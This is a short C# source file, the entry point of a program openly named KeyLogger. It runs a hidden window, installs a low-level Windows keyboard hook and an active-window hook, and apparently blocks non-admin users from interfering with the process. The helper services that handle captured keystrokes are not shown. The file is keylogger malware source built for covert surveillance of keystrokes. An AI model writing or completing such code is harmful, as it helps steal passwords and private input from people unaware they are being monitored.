using System.Windows.Forms;
using KeyLogger.Enums;
using static KeyLogger.WinApis.User32;
using KeyLogger.Forms;
using KeyLogger.Services;

namespace KeyLogger
{
	class Program
	{
		private static HiddenForm HiddenForm;
		private static HandleUserInputsService _handleUserInputsService;
		private static ProcessAccessService _processAccessService;

		public static void Main()
		{
			HiddenForm = new HiddenForm();
			_handleUserInputsService = new HandleUserInputsService(HiddenForm);
			_processAccessService = new ProcessAccessService();
			HandleUserInputsService.HookId = _handleUserInputsService.SetHook(HookTypes.WH_KEYBOARD_LL, HandleUserInputsService.KeyLoggerHookCallback);
			HandleUserInputsService.WindowHookId = _handleUserInputsService.SetWinHook(HandleUserInputsService.ActiveWindowsHook);
			_processAccessService.BlockForNotAdminUsers();
			Application.Run(HiddenForm);
			UnhookWindowsHookEx(HandleUserInputsService.HookId);
			UnhookWindowsHookEx(HandleUserInputsService.WindowHookId);
		}


	}
}
